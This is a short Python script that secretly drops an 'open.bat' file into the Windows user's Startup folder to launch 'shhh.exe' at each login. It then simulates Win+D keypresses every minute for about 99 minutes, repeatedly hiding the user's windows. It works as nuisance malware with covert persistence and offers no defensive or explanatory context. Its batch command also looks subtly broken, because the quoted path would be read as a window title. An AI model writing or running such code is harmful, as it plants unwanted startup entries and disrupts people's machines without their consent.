from pynput.keyboard import Key, Controller
import time
import getpass, os

keyboard = Controller()

USER_NAME = getpass.getuser()

file_path = os.path.dirname(os.path.realpath(__file__))
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
	bat_file.write(r'start "%s\shhh.exe"' % file_path)

for x in range(1,100):
	keyboard.press(Key.cmd)
	keyboard.press('d')
	keyboard.release('d')
	keyboard.release(Key.cmd)
	time.sleep(60)